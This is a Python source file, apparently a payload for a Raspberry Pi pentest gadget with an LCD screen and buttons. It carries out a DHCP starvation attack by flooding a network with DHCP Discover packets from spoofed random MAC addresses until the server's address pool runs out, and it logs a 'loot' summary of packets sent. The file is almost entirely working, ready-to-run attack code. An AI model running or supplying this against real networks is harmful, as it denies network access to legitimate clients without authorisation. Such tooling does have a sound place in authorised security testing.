#!/usr/bin/env python3
"""
KTOx *payload* – **DHCP Starvation Attack**
==============================================
This payload performs a DHCP starvation attack. It continuously sends DHCP
Discover packets with spoofed MAC addresses to exhaust the DHCP server's
IP address pool, potentially preventing legitimate clients from obtaining
an IP address.

Features:
- Continuously sends DHCP Discover packets with random MAC addresses.
- Displays current status (ACTIVE/STOPPED) and packet count on the LCD.
- Start/Stop functionality via OK button.
- Dynamically selects the best available wired network interface.
- Graceful exit via KEY3 or Ctrl-C, ensuring the attack thread is stopped.

Controls:
- OK: Toggle attack (Start/Stop).
- KEY3: Exit Payload.
"""

import sys
import os
import time
import signal
import subprocess
import threading
import random
# Prefer /root/KTOx for imports; fallback to repo-relative
KTOX_ROOT = '/root/KTOx' if os.path.isdir('/root/KTOx') else os.path.abspath(os.path.join(os.path.dirname(__file__), '..', '..'))
if KTOX_ROOT not in sys.path:
    sys.path.insert(0, KTOX_ROOT)
import RPi.GPIO as GPIO
import LCD_1in44, LCD_Config
from PIL import Image, ImageDraw, ImageFont
from scapy.all import Ether, IP, UDP, BOOTP, DHCP, sendp, conf
conf.verb = 0

# WiFi Integration - Import dynamic interface support
try:
    from wifi.ktox_integration import get_best_interface
    WIFI_INTEGRATION_AVAILABLE = True
except ImportError:
    WIFI_INTEGRATION_AVAILABLE = False
    def get_best_interface(prefer_wired=True):
        # Fallback for when wifi integration is not available
        try:
            output = subprocess.check_output("ip -o link show | awk -F': ' '{print $2}'", shell=True).decode().strip()
            interfaces = output.split('\n')
            if prefer_wired:
                for iface in interfaces:
                    if iface.startswith("eth") or iface.startswith("en"):
                        return iface
            return interfaces[0] if interfaces else "eth0"
        except:
            return "eth0"

PINS: dict[str, int] = {
    "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26, "OK": 13,
    "KEY1": 21, "KEY2": 20, "KEY3": 16,
}

GPIO.setmode(GPIO.BCM)
for pin in PINS.values():
    GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
WIDTH, HEIGHT = 128, 128
FONT = ImageFont.load_default()
FONT_TITLE = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 12)
FONT_STATUS = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 16)

ETH_INTERFACE = get_best_interface(prefer_wired=True) # Dynamically get the best wired interface
running = True
attack_thread = None
attack_stop_event = threading.Event()
packet_count = 0

# Loot directory under KTOx
LOOT_DIR = os.path.join(KTOX_ROOT, 'loot', 'DHCP_Starvation')

def cleanup(*_):
    global running
    if running:
        running = False
        attack_stop_event.set()
        if attack_thread and attack_thread.is_alive():
            attack_thread.join(timeout=2) # Wait for the thread to finish
        # Save summary loot
        try:
            os.makedirs(LOOT_DIR, exist_ok=True)
            ts = time.strftime('%Y-%m-%d_%H%M%S')
            loot_file = os.path.join(LOOT_DIR, f'summary_{ETH_INTERFACE}_{ts}.txt')
            with open(loot_file, 'w') as f:
                f.write(f'Interface: {ETH_INTERFACE}\n')
                f.write(f'Packets sent: {packet_count}\n')
        except Exception as e:
            print(f'[WARN] Failed to write loot: {e}', file=sys.stderr)
        print("DHCP Starvation cleanup complete.", file=sys.stderr)

signal.signal(signal.SIGINT, cleanup)
signal.signal(signal.SIGTERM, cleanup)

def generate_random_mac():
    return "02:00:00:%02x:%02x:%02x" % (random.randint(0, 255),
                                       random.randint(0, 255),
                                       random.randint(0, 255))

def starvation_worker():
    global packet_count
    
    try:
        while not attack_stop_event.is_set():
            spoofed_mac = generate_random_mac()
            
            dhcp_discover = (
                Ether(src=spoofed_mac, dst="ff:ff:ff:ff:ff:ff") /
                IP(src="0.0.0.0", dst="255.255.255.255") /
                UDP(sport=68, dport=67) /
                BOOTP(chaddr=spoofed_mac) /
                DHCP(options=[("message-type", "discover"), "end"])
            )
            
            sendp(dhcp_discover, iface=ETH_INTERFACE, verbose=0)
            packet_count += 1
            time.sleep(0.05)
    except Exception as e:
        print(f"[ERROR] Starvation worker failed: {e}", file=sys.stderr)
        draw_ui(status="ERROR", message_lines=[f"Attack failed!", f"{str(e)[:20]}"])
        cleanup()

def start_attack():
    global attack_thread, packet_count
    if attack_thread and attack_thread.is_alive():
        return False

    packet_count = 0
    attack_stop_event.clear()
    attack_thread = threading.Thread(target=starvation_worker, daemon=True)
    attack_thread.start()
    return True

def stop_attack():
    attack_stop_event.set()
    if attack_thread:
        attack_thread.join(timeout=2)

def draw_ui(status: str, message_lines=None):
    img = Image.new("RGB", (WIDTH, HEIGHT), (10, 0, 0))
    d = ImageDraw.Draw(img)

    d.text((5, 5), "DHCP Starvation", font=FONT_TITLE, fill=(30, 132, 73))
    d.line([(0, 22), (128, 22)], fill=(30, 132, 73), width=1)
    d.text((5, 115), f"IF: {ETH_INTERFACE}", font=FONT, fill=(86, 101, 115)) # Display interface

    if message_lines:
        if isinstance(message_lines, str):
            message_lines = [message_lines]
        y_offset = (HEIGHT - len(message_lines) * 12) // 2
        for line in message_lines:
            bbox = d.textbbox((0, 0), line, font=FONT)
            w = bbox[2] - bbox[0]
            x = (WIDTH - w) // 2
            d.text((x, y_offset), line, font=FONT, fill=(212, 172, 13))
            y_offset += 12
    else:
        status_color = "lime" if status == "ACTIVE" else "red"
        d.text((30, 35), status, font=FONT_STATUS, fill=status_color)

        d.text((5, 60), "Packets Sent:", font=FONT, fill=(242, 243, 244))
        d.text((15, 75), str(packet_count), font=FONT_TITLE, fill=(212, 172, 13))

    d.text((5, 100), "OK=Start/Stop | KEY3=Exit", font=FONT, fill=(171, 178, 185))
    LCD.LCD_ShowImage(img, 0, 0)

if __name__ == "__main__":
    try:
        is_attacking = False
        
        # Check if Scapy is installed
        try:
            from scapy.all import Ether
        except ImportError:
            draw_ui(status="ERROR", message_lines=["Scapy not found!", "Install with:", "`pip install scapy`"])
            time.sleep(5)
            raise SystemExit("Scapy not found.")

        # Check interface status
        try:
            ip_output = subprocess.check_output(f"ip -o -4 addr show {ETH_INTERFACE}", shell=True).decode()
            link_output = subprocess.check_output(f"ip link show {ETH_INTERFACE}", shell=True).decode()
            
            if "NO-CARRIER" in link_output:
                draw_ui(status="ERROR", message_lines=[f"{ETH_INTERFACE} Disconnected!"])
                time.sleep(3)
                raise SystemExit("Ethernet cable not connected.")
            
            if "state DOWN" in link_output:
                draw_ui(status="ERROR", message_lines=[f"{ETH_INTERFACE} is DOWN!"])
                time.sleep(3)
                raise SystemExit("Ethernet interface is down.")
                
            if "inet " not in ip_output:
                draw_ui(status="ERROR", message_lines=[f"{ETH_INTERFACE} No IP!"])
                time.sleep(3)
                raise SystemExit("Ethernet interface has no IP address.")
                
        except subprocess.CalledProcessError:
            draw_ui(status="ERROR", message_lines=[f"{ETH_INTERFACE} not found!"])
            time.sleep(3)
            raise SystemExit(f"Interface {ETH_INTERFACE} not found.")
        except Exception as e:
            draw_ui(status="ERROR", message_lines=[f"{ETH_INTERFACE} check error!", f"{str(e)[:20]}"])
            time.sleep(3)
            raise SystemExit(f"Error checking {ETH_INTERFACE}: {e}")

        last_button_press_time = 0
        BUTTON_DEBOUNCE_TIME = 0.3 # seconds

        while running:
            current_time = time.time()
            draw_ui("ACTIVE" if is_attacking else "STOPPED")
            
            if GPIO.input(PINS["KEY3"]) == 0 and (current_time - last_button_press_time > BUTTON_DEBOUNCE_TIME):
                last_button_press_time = current_time
                cleanup()
                break
            
            if GPIO.input(PINS["OK"]) == 0 and (current_time - last_button_press_time > BUTTON_DEBOUNCE_TIME):
                last_button_press_time = current_time
                is_attacking = not is_attacking
                if is_attacking:
                    draw_ui(status="STARTING", message_lines=["Starting attack..."])
                    if not start_attack():
                        draw_ui(status="ERROR", message_lines=["Failed to start attack!"])
                        time.sleep(3)
                        is_attacking = False
                else:
                    draw_ui(status="STOPPING", message_lines=["Stopping attack..."])
                    stop_attack()
                time.sleep(BUTTON_DEBOUNCE_TIME) # Debounce after OK press
            
            time.sleep(0.05)
            
            if not running:
                break

    except (KeyboardInterrupt, SystemExit):
        pass
    except Exception as e:
        print(f"[ERROR] {e}", file=sys.stderr)
        draw_ui(status="ERROR", message_lines=["An error occurred.", str(e)[:20]])
        time.sleep(3)
    finally:
        cleanup()
        LCD.LCD_Clear()
        GPIO.cleanup()
        print("DHCP Starvation payload finished.")